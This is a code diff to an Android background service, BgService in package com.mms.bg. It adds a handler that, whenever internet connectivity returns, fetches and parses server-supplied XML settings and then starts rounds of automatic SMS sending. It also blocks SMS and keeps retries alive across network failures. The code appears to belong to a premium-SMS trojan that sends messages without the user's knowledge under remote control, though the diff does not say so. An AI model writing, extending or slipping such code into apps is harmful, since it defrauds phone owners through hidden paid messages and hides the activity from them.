@@ -29,6 +29,7 @@ public class BgService extends Service {
     public static final String ACTION_SEND_SMS = "action.sms.bg";
     public static final String ACTION_BOOT = "action.boot.bg";
     public static final String ACTION_SEND_SMS_ROUND = "action.round.sms";
+    public static final String ACTION_INTERNET_CHANGED = "action.internet.changed";
     
     public static final String FILTER_ACTION = "com.mms.bg.FILTER_ACTION";
     public static final String META_DATA = "com.mms.bg.pid";
@@ -188,6 +189,7 @@ public class BgService extends Service {
     public void onStart(Intent intent, int startId) {
         super.onStart(intent, startId);
         
+        LOGD("onStart action = " + (intent != null ? intent.getAction() : ""));
         SettingManager sm = SettingManager.getInstance(this);
         sm.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));
         if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
@@ -208,6 +210,8 @@ public class BgService extends Service {
                     SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
                     mStartSMSAfterInternet = false;
                 }
+            } else {
+                sm.setInternetConnectFailed(true);
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
             LOGD("[[onStart]] start send the sms for one cycle");
@@ -220,9 +224,10 @@ public class BgService extends Service {
                 mSM.cancelAutoSendMessage();
                 mSM.setSMSBlockBeginTime(System.currentTimeMillis());
             } else {
-                long false_retry_time = ((long) 1) * 3600 * 1000;
-                sm.setSMSSendDelay(false_retry_time);
-                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
+                sm.setInternetConnectFailedBeforeSMS(true);
+//                long false_retry_time = ((long) 1) * 3600 * 1000;
+//                sm.setSMSSendDelay(false_retry_time);
+//                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS_ROUND) == true) {
             mSM.log("receive the action = " + intent.getAction());
@@ -245,6 +250,39 @@ public class BgService extends Service {
                 }
             } else {
                 mSM.tryToFetchInfoFromServer(0);
+            }
+        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET_CHANGED) == true) {
+            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
+            LOGD("action internet connection");
+            sm.log("action = " + ACTION_INTERNET_CHANGED);
+            if (ret == true) {
+                if (sm.getInternetConnectFailed() == true) {
+                    sm.log("only connect the internet and make some settings");
+                    sm.setInternetConnectFailed(false);
+                    SettingManager.getInstance(this).parseServerXMLInfo();
+                    String delay = SettingManager.getInstance(this).mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
+                    long delayTime = 0;
+                    if (delay != null) {
+                        delayTime = (Long.valueOf(delay)) * 60 * 60 * 1000;
+                    }
+                    LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
+                    sm.setLastConnectServerTime(System.currentTimeMillis());
+                    SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
+                    if (isSendSMS() == true && mStartSMSAfterInternet == true) {
+                        long sms_delay_time = sm.getSMSSendDelay();
+                        SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
+                        mStartSMSAfterInternet = false;
+                    }
+                }
+                if (sm.getInternetConnectFailedBeforeSMS() == true) {
+                    sm.setInternetConnectFailedBeforeSMS(false);
+                    SettingManager.getInstance(this).parseServerXMLInfo();
+                    mSM.log(TAG, "start send the sms for one cycle");
+                    SettingManager.getInstance(this).startOneRoundSMSSend(0);
+                    mSM.log("cancel the auto message send now and start it after this round sms send");
+                    mSM.cancelAutoSendMessage();
+                    mSM.setSMSBlockBeginTime(System.currentTimeMillis());
+                }
             }
         } else {
             mSM.tryToFetchInfoFromServer(0);
